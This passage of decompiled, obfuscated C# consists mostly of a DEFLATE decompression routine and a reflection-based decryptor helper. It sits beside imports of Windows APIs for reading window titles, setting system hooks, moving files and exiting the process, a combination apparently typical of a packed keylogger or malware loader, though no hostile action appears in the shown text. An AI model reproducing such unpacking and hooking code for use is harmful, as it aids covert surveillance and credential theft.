					class16_0.int_5 = Class15.Class16.int_1[num2 - 257];
					goto case 8;
				}
				if (num2 < 0)
				{
					return false;
				}
				class16_0.class19_1 = null;
				class16_0.class19_0 = null;
				class16_0.int_4 = 2;
				return true;
			}
			case 8:
				if (class16_0.int_5 > 0)
				{
					class16_0.int_4 = 8;
					int num4 = Class22.smethod_1(class16_0.class17_0, class16_0.int_5);
					if (num4 < 0)
					{
						return false;
					}
					Class22.smethod_21(class16_0.class17_0, class16_0.int_5);
					class16_0.int_6 += num4;
				}
				class16_0.int_4 = 9;
				goto case 9;
			case 9:
			{
				int num2 = Class22.smethod_8(class16_0.class19_1, class16_0.class17_0);
				if (num2 >= 0)
				{
					class16_0.int_7 = Class15.Class16.int_2[num2];
					class16_0.int_5 = Class15.Class16.int_3[num2];
					goto case 10;
				}
				return false;
			}
			case 10:
				if (class16_0.int_5 > 0)
				{
					class16_0.int_4 = 10;
					int num3 = Class22.smethod_1(class16_0.class17_0, class16_0.int_5);
					if (num3 < 0)
					{
						return false;
					}
					Class22.smethod_21(class16_0.class17_0, class16_0.int_5);
					class16_0.int_7 += num3;
				}
				Class22.smethod_39(class16_0.class18_0, class16_0.int_6, class16_0.int_7);
				num -= class16_0.int_6;
				class16_0.int_4 = 7;
				break;
			}
		}
		return true;
	}

	[DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	static extern int ExitProcess(uint uint_0);

	static ICryptoTransform smethod_32(bool bool_0, Class13 class13_0, byte[] byte_0, byte[] byte_1)
	{
		class13_0.type_0.GetProperty("Key")!.GetSetMethod()!.Invoke(class13_0.object_0, new object[1] { byte_0 });
		class13_0.type_0.GetProperty("IV")!.GetSetMethod()!.Invoke(class13_0.object_0, new object[1] { byte_1 });
		MethodInfo method = class13_0.type_0.GetMethod(bool_0 ? "CreateDecryptor" : "CreateEncryptor", new Type[0]);
		return (ICryptoTransform)method.Invoke(class13_0.object_0, new object[0]);
	}

	static bool smethod_33(Class15.Class17 class17_0)
	{
		return class17_0.int_0 == class17_0.int_1;
	}

	[DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	static extern int MoveFileExW([In][MarshalAs(UnmanagedType.LPTStr)] string string_0, [In][MarshalAs(UnmanagedType.LPTStr)] string string_1, long long_0);

	static int smethod_34(byte[] byte_0, Class15.Class16 class16_0, int int_0, int int_1)
	{
		int num = 0;
		do
		{
			if (class16_0.int_4 != 11)
			{
				int num2 = Class22.smethod_15(byte_0, int_0, class16_0.class18_0, int_1);
				int_0 += num2;
				num += num2;
				int_1 -= num2;
				if (int_1 == 0)
				{
					return num;
				}
			}
		}
		while (Class22.smethod_19(class16_0) || (class16_0.class18_0.int_1 > 0 && class16_0.int_4 != 11));
		return num;
	}

	static void smethod_35(byte[] byte_0, Class15.Class17 class17_0, int int_0, int int_1)
	{
		if (class17_0.int_0 < class17_0.int_1)
		{
			throw new InvalidOperationException();
		}
		int num = int_0 + int_1;
		if (0 <= int_0 && int_0 <= num && num <= byte_0.Length)
		{
			if (((uint)int_1 & (true ? 1u : 0u)) != 0)
			{
				class17_0.uint_0 |= (uint)((byte_0[int_0++] & 0xFF) << class17_0.int_2);
				class17_0.int_2 += 8;
			}
			class17_0.byte_0 = byte_0;
			class17_0.int_0 = int_0;
			class17_0.int_1 = num;
			return;
		}
		throw new ArgumentOutOfRangeException();
	}

	[DllImport("user32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	static extern int GetWindowTextA(int int_0, StringBuilder stringBuilder_0, int int_1);

	static int smethod_36(Class15.Class17 class17_0, byte[] byte_0, int int_0, int int_1)
	{
		int num = 0;
		while (class17_0.int_2 > 0 && int_1 > 0)
		{
			byte_0[int_0++] = (byte)class17_0.uint_0;
			class17_0.uint_0 >>= 8;
			class17_0.int_2 -= 8;
			int_1--;
			num++;
		}
		if (int_1 == 0)
		{
			return num;
		}
		int num2 = class17_0.int_1 - class17_0.int_0;
		if (int_1 > num2)
		{
			int_1 = num2;
		}
		Array.Copy(class17_0.byte_0, class17_0.int_0, byte_0, int_0, int_1);
		class17_0.int_0 += int_1;
		if (((uint)(class17_0.int_0 - class17_0.int_1) & (true ? 1u : 0u)) != 0)
		{
			class17_0.uint_0 = class17_0.byte_0[class17_0.int_0++] & 0xFFu;
			class17_0.int_2 = 8;
		}
		return num + int_1;
	}

	[DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	static extern int SetWindowsHookExA(int int_0, Class7.Delegate0 delegate0_0, int int_1, int int_2);

	static bool smethod_37(Class15.Class20 class20_0, Class15.Class17 class17_0)
	{
		while (true)
		{
			switch (class20_0.int_2)
			{
			case 5:
			{
				int int_ = Class15.Class20.int_1[class20_0.int_7];
				int num = Class22.smethod_1(class17_0, int_);
				if (num >= 0)
				{
					Class22.smethod_21(class17_0, int_);
					num += Class15.Class20.int_0[class20_0.int_7];
					while (num-- > 0)
					{
						class20_0.byte_1[class20_0.int_8++] = class20_0.byte_2;
					}
					if (class20_0.int_8 == class20_0.int_6)
					{
						return true;
					}
					goto IL_009b;
				}
				return false;
			}
			case 4:
			{
				int num2;
				while (((num2 = Class22.smethod_8(class20_0.class19_0, class17_0)) & -16) == 0)
				{
					class20_0.byte_1[class20_0.int_8++] = (class20_0.byte_2 = (byte)num2);
					if (class20_0.int_8 == class20_0.int_6)
					{
						return true;
					}
				}
				if (num2 >= 0)
				{
					if (num2 >= 17)
					{
						class20_0.byte_2 = 0;
					}
					class20_0.int_7 = num2 - 16;
					class20_0.int_2 = 5;
					goto case 5;
				}
				return false;
			}
			case 3:
				while (class20_0.int_8 < class20_0.int_5)
				{
					int num3 = Class22.smethod_1(class17_0, 3);
					if (num3 >= 0)
					{
						Class22.smethod_21(class17_0, 3);
						class20_0.byte_0[Class15.Class20.int_9[class20_0.int_8]] = (byte)num3;
						class20_0.int_8++;
						continue;
					}
					return false;
				}
				class20_0.class19_0 = new Class15.Class19(class20_0.byte_0);
				class20_0.byte_0 = null;
				class20_0.int_8 = 0;
				class20_0.int_2 = 4;
				goto case 4;
			case 2:
				class20_0.int_5 = Class22.smethod_1(class17_0, 4);
				if (class20_0.int_5 >= 0)
				{
					class20_0.int_5 += 4;
					Class22.smethod_21(class17_0, 4);
					class20_0.byte_0 = new byte[19];
					class20_0.int_8 = 0;
					class20_0.int_2 = 3;
					goto case 3;
				}
				return false;
			case 1:
				class20_0.int_4 = Class22.smethod_1(class17_0, 5);
				if (class20_0.int_4 >= 0)
				{
					class20_0.int_4++;
					Class22.smethod_21(class17_0, 5);
					class20_0.int_6 = class20_0.int_3 + class20_0.int_4;
					class20_0.byte_1 = new byte[class20_0.int_6];
					class20_0.int_2 = 2;
					goto case 2;
				}
				return false;
			case 0:
				class20_0.int_3 = Class22.smethod_1(class17_0, 5);
				if (class20_0.int_3 >= 0)
				{
					class20_0.int_3 += 257;
					Class22.smethod_21(class17_0, 5);
					class20_0.int_2 = 1;
					goto case 1;
				}
				return false;
			}
			continue;
			IL_009b:
			class20_0.int_2 = 4;
		}
	}

	static Class15.Class19 smethod_38(Class15.Class20 class20_0)
	{
		byte[] array = new byte[class20_0.int_3];
		Array.Copy(class20_0.byte_1, 0, array, 0, class20_0.int_3);
		return new Class15.Class19(array);
	}

	static void smethod_39(Class15.Class18 class18_0, int int_0, int int_1)
	{
		if ((class18_0.int_1 += int_0) > 32768)
		{
			throw new InvalidOperationException();
		}
		int num = (class18_0.int_0 - int_1) & 0x7FFF;
		int num2 = 32768 - int_0;
		if (num <= num2 && class18_0.int_0 < num2)
		{
			if (int_0 <= int_1)
			{
				Array.Copy(class18_0.byte_0, num, class18_0.byte_0, class18_0.int_0, int_0);
				class18_0.int_0 += int_0;
			}
			else
			{
				while (int_0-- > 0)
				{
					class18_0.byte_0[class18_0.int_0++] = class18_0.byte_0[num++];
				}
			}
		}
		else
		{
			Class22.smethod_12(class18_0, num, int_0, int_1);
		}
	}

	static int smethod_40(Class15.Class17 class17_0)
	{
		return class17_0.int_1 - class17_0.int_0 + (class17_0.int_2 >> 3);
	}
}
